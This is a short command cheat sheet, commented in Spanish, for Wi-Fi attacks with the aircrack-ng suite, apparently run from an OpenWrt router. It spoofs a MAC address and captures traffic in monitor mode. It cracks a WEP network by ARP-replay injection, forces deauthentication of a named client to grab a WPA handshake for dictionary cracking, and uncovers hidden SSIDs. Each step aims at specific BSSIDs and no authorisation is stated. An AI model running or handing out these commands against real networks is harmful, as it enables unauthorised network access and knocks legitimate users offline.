
opkg update
opkg install macchanger

iw dev
airodump-ng phy1-mon0 --band a --write /tmp/20251026_monitoring_5ghz
airodump-ng phy1-mon0 --band a --write /tmp/20251026_monitoring_5ghz --update 5 --output-format csv,pcap

ifconfig phy1-mon0 down
macchanger -m 5A:62:8B:4C:D3:25 phy1-mon0
ifconfig phy1-mon0 up


1. Ataque a Red WEP (20:05:B7:00:58:7A)

# Capturar paquetes IV para WEP
airodump-ng -c 40 --bssid 20:05:B7:00:58:7A -w wep_attack phy1-mon0

# En otra terminal, inyectar tráfico para acelerar
aireplay-ng --arpreplay -b 20:05:B7:00:58:7A -h 5A:62:8B:4C:D3:25 phy1-mon0

# Cuando tengas suficientes IVs, romper la clave
aircrack-ng wep_attack-01.cap

2. Ataque a Red WPA (A4:08:F5:E5:AE:8F)

# Capturar handshake WPA
airodump-ng -c 40 --bssid A4:08:F5:E5:AE:8F -w wpa_attack phy1-mon0

# Forzar deautenticación para capturar handshake
aireplay-ng --deauth 10 -a A4:08:F5:E5:AE:8F -c A0:D0:DC:DB:02:8E phy1-mon0

# Verificar handshake capturado
aircrack-ng wpa_attack-01.cap

# Romper con diccionario
aircrack-ng -w /path/to/wordlist.txt -b A4:08:F5:E5:AE:8F wpa_attack-01.cap

3. Revelar SSID Ocultos

# Monitorear redes con SSID oculto
airodump-ng phy1-mon0 --band a --channel 40

# Esperar que clientes se conecten y revelen SSID
# O forzar deautenticación y reconexión


----


opkg update
opkg install curl
